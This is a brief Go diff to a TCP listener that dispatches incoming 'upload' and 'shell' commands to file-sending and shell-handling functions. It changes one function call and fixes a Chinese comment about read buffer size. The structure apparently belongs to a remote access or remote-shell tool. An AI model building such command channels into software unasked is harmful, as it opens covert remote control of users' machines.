@@ -29,7 +29,7 @@ var send = func(conn net.Conn) {
 			}
 		default:
 			if strings.Index(cmd, "upload") >= 0 {
-				sendFile(cmd, conn)
+				sendFile(conn)
 			} else if strings.Index(cmd, "shell") >= 0 {
 				sendShell(cmd, conn)
 			} else {
@@ -46,7 +46,7 @@ func Listeners() {
 			var buffer bytes.Buffer
 		read:
 			for {
-				// 每次读取2个字节
+				// 每次读取1K
 				temp := make([]byte, 1024)
 				cnt, err := conn.Read(temp)
 				if err != nil {
